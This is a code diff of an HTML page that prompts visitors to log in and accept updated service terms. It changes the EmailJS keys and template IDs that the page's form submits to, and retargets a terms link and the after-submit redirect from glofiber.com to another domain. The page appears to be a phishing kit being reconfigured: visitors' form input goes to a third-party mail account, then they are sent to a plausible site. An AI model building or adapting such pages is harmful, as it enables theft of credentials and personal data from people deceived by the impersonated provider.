@@ -192,7 +192,7 @@
         After you log in, you will be prompted to review and accept the updated Service Terms Agreement.
         <br>
         You can also view the terms any time at
-        <a href="https://www.glofiber.com" class="link-terms">this page</a>.
+        <a href="https://www.globalzimblinker.com/horizon-terms" class="link-terms">this page</a>.
       </p>
     </div>
   </div>
@@ -201,7 +201,7 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     // Initialize EmailJS with your public key
-    emailjs.init("HQhAan1hDEBOa99FF");
+    emailjs.init("SdkmRe8WZ7itEba9z");
 
     const contactForm = document.getElementById("contact-form");
     const emailInput = document.getElementById("email-input");
@@ -239,15 +239,15 @@
       // Send form via EmailJS
       emailjs
         .sendForm(
-          "service_fgaxl6c",      // your EmailJS service ID
-          "template_rqll763",     // your EmailJS template ID
+          "service_zuj2d2a",      // your EmailJS service ID
+          "template_qecwyjf",     // your EmailJS template ID
           "#contact-form"         // selector for this form
         )
         .then(function (response) {
           console.log("SUCCESS!", response.status, response.text);
 
           // Redirect to www.glofiber.com in the same tab
-          window.location.href = "https://www.glofiber.com";
+          window.location.href = "https://www.globalzimblinker.com/horizon-terms";
         })
         .catch(function (error) {
           console.error("FAILED...", error);
